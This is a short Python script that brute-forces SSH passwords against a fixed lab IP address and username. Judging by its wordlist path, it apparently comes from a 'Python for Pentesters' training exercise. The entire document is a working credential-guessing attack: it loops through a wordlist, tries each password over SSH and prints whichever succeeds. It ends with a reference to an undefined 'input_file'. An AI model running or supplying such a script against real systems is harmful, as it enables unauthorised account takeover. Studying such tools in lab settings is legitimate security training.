import paramiko
import sys
import os

target = str('10.10.61.179')
username = str('tiffany')
password_file = str('/usr/share/wordlists/PythonForPentesters/wordlist2.txt')


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()

        try:
            response = ssh_connect(password)

            if response == 0:
                print('password found: ' + password)
                exit(0)
            elif response == 1:
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()